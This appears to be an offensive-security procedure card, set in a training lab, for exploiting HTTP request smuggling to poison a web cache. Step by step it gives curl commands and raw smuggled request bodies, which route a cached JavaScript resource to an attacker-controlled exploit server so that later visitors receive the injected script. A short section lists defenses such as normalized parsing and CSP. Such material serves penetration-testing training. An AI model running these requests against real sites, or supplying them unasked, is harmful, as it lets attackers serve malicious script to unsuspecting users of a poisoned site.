---
id: 64237552-5963-42fa-8ec0-6788f4062392
name: HTTP-Request-Smuggling-to-Perform-Cache-Poisoning
type: procedure
verified: true
submitted: true
created_at: '2020-09-01T18:00:44.403793+00:00'
updated_at: '2023-05-26T01:34:35.088079+00:00'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - http-request-smuggling
  - web-applications
  - web-cache-poisoning
commands:
  - '[[commands/curl-send-initial-navigation-request]]'
  - '[[commands/curl-send-smuggled-poisoning-request]]'
platforms:
  - Web
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# HTTP-Request-Smuggling-to-Perform-Cache-Poisoning

## Summary

This procedure exploits an HTTP request smuggling vulnerability in a web application to perform cache poisoning, allowing an attacker to manipulate cached responses and deliver malicious content, such as JavaScript payloads, to subsequent users who access the poisoned page. By smuggling a malicious request, the attacker can redirect or inject content that persists in the cache, making the attack more persistent and affecting multiple victims without repeated exploitation.

## Description

HTTP request smuggling occurs when a web server or proxy misinterprets the boundaries between HTTP requests, allowing an attacker to inject a second request into the body of the first. In this scenario, the vulnerability is used to poison the web cache by smuggling a request that fetches malicious resources (e.g., a JavaScript file hosted on an attacker-controlled server). This leads to cache poisoning, where the application's cache stores the attacker's manipulated response. Any user visiting the affected page afterward will receive the poisoned content, potentially executing malicious JavaScript like an alert or more sophisticated exploits. This technique targets applications with front-end caches (e.g., CDNs or reverse proxies) that are vulnerable to smuggling due to inconsistent HTTP parsing (e.g., differing interpretations of Content-Length vs. Transfer-Encoding). The target environment is typically a web application with user navigation features, such as blog posts with 'next post' links, and requires the ability to intercept and modify HTTP traffic.

## Requirements

1. Access to a proxy tool like Burp Suite for intercepting and modifying HTTP requests.
2. Knowledge of the target application's URL structure, particularly navigation endpoints (e.g., /post/next).
3. An attacker-controlled server to host malicious resources (e.g., JavaScript files).
4. Network access to the target web application without authentication barriers for the initial requests.
5. Basic understanding of HTTP/1.1 smuggling techniques, such as CL.TE smuggling.

## Defense

Defensive measures and detection strategies:

- Normalize HTTP request parsing across front-end proxies and back-end servers to prevent smuggling (e.g., reject ambiguous requests).
- Implement strict cache invalidation policies and validate cached responses for integrity before serving.
- Monitor for anomalous requests with mismatched Content-Length and Transfer-Encoding headers using WAF rules.
- Enable logging of all HTTP requests and responses to detect repeated smuggling patterns or unexpected resource fetches.
- Use Content Security Policy (CSP) to restrict script sources and prevent execution of injected JavaScript.

## Objectives

1. Exploit HTTP request smuggling to inject a malicious secondary request.
2. Poison the web cache with attacker-controlled content to persist the exploit.
3. Deliver and execute malicious JavaScript on victim browsers via the poisoned cache.
4. Verify the poisoning by observing the exploit trigger on subsequent visits.

## Instructions

### Step 1: Intercept Initial Navigation Request

**Context**: Begin by navigating the target application to trigger a vulnerable request, such as clicking 'next post' on a blog page. Use a proxy to intercept this request, which will serve as the smuggling vehicle. This step identifies the base request structure for modification.

**Command** ([[commands/curl-send-initial-navigation-request]]):
```bash
curl -X GET "http://target-lab-id.web-security-academy.net/post?postId=1" -H "Host: target-lab-id.web-security-academy.net" --proxy http://127.0.0.1:8080
```

> This command simulates the initial GET request to the post endpoint. In Burp Suite, intercept the traffic (set browser proxy to 127.0.0.1:8080) and forward the request to Repeater for modification. Expected output is the HTML response for the post page, confirming the endpoint is reachable.

### Step 2: Craft and Send Smuggled Request for Testing

**Context**: In Burp Repeater, modify the intercepted request to include a smuggled secondary request with a different Host header. This tests the smuggling by attempting to redirect or fetch from a controlled domain. The smuggled request uses a short Content-Length to desynchronize parsing.

**Instructions**: Append the following to the original request body:

```
0

GET /post/next?postId=3 HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

Forward the request and observe if the server processes the smuggled part separately.

**Expected Output**: The primary request completes normally, but the smuggled request may cause a redirect or error indicating desynchronization (e.g., 301 to localhost or unexpected response).

### Step 3: Host Malicious JavaScript Payload

**Context**: Create and host a simple JavaScript file on an attacker-controlled server to serve as the poison payload. This file will be fetched via the smuggled request to inject into the cache.

**Instructions**: Save the following as tracking.js on your exploit server:

```javascript
alert(1);
```

Upload to a hosting service (e.g., your-exploit-server-hostname.web-security-academy.net/resources/js/tracking.js). Verify accessibility via browser.

**Expected Output**: The JS file loads and executes alert(1) when accessed directly.

### Step 4: Send Smuggled Request for Cache Poisoning

**Context**: Repeat the smuggled request multiple times, modifying the Host to point to your exploit server. Append a fetch for the malicious JS to poison the cache for the /resources/js/tracking.js endpoint.

**Command** ([[commands/curl-send-smuggled-poisoning-request]]):
```bash
curl -X POST "http://target-lab-id.web-security-academy.net/post/next" -H "Host: target-lab-id.web-security-academy.net" -H "Content-Type: application/x-www-form-urlencoded" -d "x=1&0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: your-exploit-server-hostname.web-security-academy.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 10\n\nx=1\n\nGET /resources/js/tracking.js HTTP/1.1\nHost: target-lab-id.web-security-academy.net\nConnection: close" --proxy http://127.0.0.1:8080
```

> This crafts the full smuggled request in curl syntax (escaped newlines). Send 5-10 times in Burp Repeater or via loop. The goal is to make the cache associate the malicious JS response with the legitimate endpoint.

**Expected Output**: Initial requests may return normal responses, but after repetition, fetching /resources/js/tracking.js returns the alert(1) script instead of the original.

### Step 5: Verify Cache Poisoning

**Context**: Test the poisoning by accessing the poisoned resource from a clean session or browser. This confirms the cache serves the malicious content to unsuspecting users.

**Instructions**: Navigate to the blog post and click 'next post', or directly request /resources/js/tracking.js. Observe if the JS executes (alert pops) or the response contains your payload.

**Expected Output**: The cached response includes the malicious JS, triggering the alert on load.

**Success Indicators**:
- Smuggled requests desynchronize without errors on the primary request.
- Repeated sends result in the cache serving attacker-controlled content.
- Subsequent uncached visits execute the payload (e.g., alert(1)).
